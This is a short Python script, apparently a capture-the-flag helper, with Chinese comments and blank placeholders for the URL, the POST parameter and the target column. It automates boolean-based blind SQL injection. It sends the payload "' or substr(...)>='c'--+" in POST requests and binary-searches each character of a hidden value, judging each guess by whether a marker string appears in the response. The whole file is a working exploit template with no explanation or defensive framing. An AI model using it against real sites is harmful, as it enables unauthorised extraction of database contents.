import requests

# url
url = ""
# 审查页面元素(正确回显)
check = ""
# _POST参数名
key = ""
# 测试语句
column = ""

flag = ""

for i in range(1, 333):
    max = 127
    min = 30
    while True:
        s = (int)((max+min)/2)
        payload = "' or substr({},{},1)>='{}'--+".format(column, i, chr(s))
        r = requests.post(url, data={key: payload})
        if (check in r.text):
            min = s
        else:
            max = s
        if((max-min) <= 1):
            flag += chr(min)
            print("Find it : "+flag)
            break
    if (max == 31):
        print("Successfully found the flag : "+flag)
        break
